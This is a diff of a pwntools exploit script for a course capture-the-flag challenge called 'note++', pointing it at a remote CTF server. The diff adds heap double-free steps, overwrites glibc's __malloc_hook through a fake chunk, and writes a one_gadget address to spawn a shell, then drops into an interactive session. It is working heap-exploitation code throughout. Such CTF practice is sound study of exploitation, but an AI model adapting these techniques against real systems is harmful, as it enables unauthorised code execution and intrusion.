@@ -4,8 +4,8 @@ from pwn import *
 context.clear(arch='x86_64')
 
 # chunk malloc hook
-# r = remote('edu-ctf.csie.org', 10178)
-r = process('./note++')
+r = remote('edu-ctf.csie.org', 10181)
+# r = process('./note++')
 libc = ELF('./libc.so', checksec=False)
 
 
@@ -61,11 +61,19 @@ delete(4)
 delete(5)
 
 # self-opening another place to do double free shit
-# delete(2)
+# strange error: delete(2)
 delete(3)
-# add(0x18, '\xaa' * 8, '\xaa' * 0x2f) # n4
-add(0x18, '\xaa' * 8, '\xbb' * 0x30) # n5
+add(0x18, '\xaa' * 8, '\xbb' * 0x30)
 delete(4)
+
+# double free error message attack
+add(0x38, '\x28', 'DOUBLE_FREE_11') #n4
+add(0x38, '\x38', 'DOUBLE_FREE_22') #n5
+
+delete(4)
+delete(5)
+
+add(0x38, '\x18', 'X' * 0x30) # padding before n5 to make is_freed become false
 
 malloc_hook = libc_base + libc.sym.__malloc_hook - 0x23# shift for 0x7f like padding
 add(0x68, p64(malloc_hook), 'MALLOC_HOOK')
@@ -74,8 +82,5 @@ add(0x68, '\x18', '\x87' * 48)
 
 binsh = libc_base + libc.search('/bin/sh').next()
 system = libc_base + libc.sym.system
-# pause()
-add(0x68, '\x00' * 0x13 + p64(libc_base + 0xf1147), 'ONE_GADGET')
-
-print('recvuntil --> ', r.recvuntil('>'))
+add(0x68, '\x00' * 0x13 + p64(libc_base + 0xf02a4), 'ONE_GADGET')
 r.interactive()
